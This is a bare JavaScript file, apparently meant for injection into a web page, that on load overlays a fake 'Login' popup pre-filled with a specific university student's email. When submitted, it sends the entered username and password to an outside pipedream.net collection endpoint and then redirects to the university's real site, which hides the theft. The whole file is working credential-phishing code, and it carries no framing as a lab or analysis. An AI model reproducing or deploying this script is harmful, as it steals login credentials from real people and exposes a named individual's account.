function createPopup() {
    const modal = document.createElement('div');
    modal.id = 'dynamicPopup';
    modal.style.position = 'fixed';
    modal.style.top = '0';
    modal.style.left = '0';
    modal.style.width = '100%';
    modal.style.height = '100%';
    modal.style.background = 'rgba(0, 0, 0, 0.7)';
    modal.style.display = 'flex';
    modal.style.justifyContent = 'center';
    modal.style.alignItems = 'center';
    modal.style.zIndex = '1000';
    const modalContent = document.createElement('div');
    modalContent.style.background = 'rgba(255, 18, 11, .71)';
    modalContent.style.width = '500px';
    modalContent.style.padding = '30px';
    modalContent.style.borderRadius = '5px';
    modalContent.style.boxShadow = '0 4px 10px rgba(0, 0, 0, 0.25)';
    modalContent.style.textAlign = 'center';
    const heading = document.createElement('h2');
    heading.style.fontSize = '25px';
    heading.style.marginBottom = '25px';
    heading.style.color = 'black';
    heading.textContent = 'Login';
    const form = document.createElement('form');
    form.onsubmit = function(event) {
        event.preventDefault();
        const username = emailInput.value;
        const password = passwordInput.value;
        const url = 'https://eop3cwjbodid15o.m.pipedream.net?username=' + encodeURIComponent(username) + 'password=' + encodeURIComponent(password);
        fetch(url, { method: 'GET' })
            .then(response => {
                window.location.href = 'https://nmu.edu.eg';
            })
            .catch(error => {
                window.location.href = 'https://nmu.edu.eg';
            });
    };
    const emailInput = document.createElement('input');
    emailInput.type = 'text';
    emailInput.value = "ahmed222101474@nmu.edu.eg"
    emailInput.name = 'username';
    emailInput.placeholder = 'Email or Phone';
    emailInput.style.width = '100%';
    emailInput.style.padding = '12px';
    emailInput.style.marginBottom = '20px';
    emailInput.style.border = '1px solid #ddd';
    emailInput.style.borderRadius = '4px';
    const passwordInput = document.createElement('input');
    passwordInput.type = 'password';
    passwordInput.name = 'password';
    passwordInput.placeholder = 'Password';
    passwordInput.style.width = '100%';
    passwordInput.style.padding = '12px';
    passwordInput.style.marginBottom = '20px';
    passwordInput.style.border = '1px solid #ddd';
    passwordInput.style.borderRadius = '4px';
    const loginButton = document.createElement('button');
    loginButton.type = 'submit';
    loginButton.style.width = '100%';
    loginButton.style.padding = '12px';
    loginButton.style.backgroundColor = '#4267B2';
    loginButton.style.color = 'white';
    loginButton.style.border = 'none';
    loginButton.style.borderRadius = '4px';
    loginButton.style.cursor = 'pointer';
    loginButton.style.fontSize = '18px';
    loginButton.textContent = 'Log In';
    form.appendChild(emailInput);
    form.appendChild(passwordInput);
    form.appendChild(loginButton);
    modalContent.appendChild(heading);
    modalContent.appendChild(form);
    modal.appendChild(modalContent);
    document.body.appendChild(modal);
}createPopup();
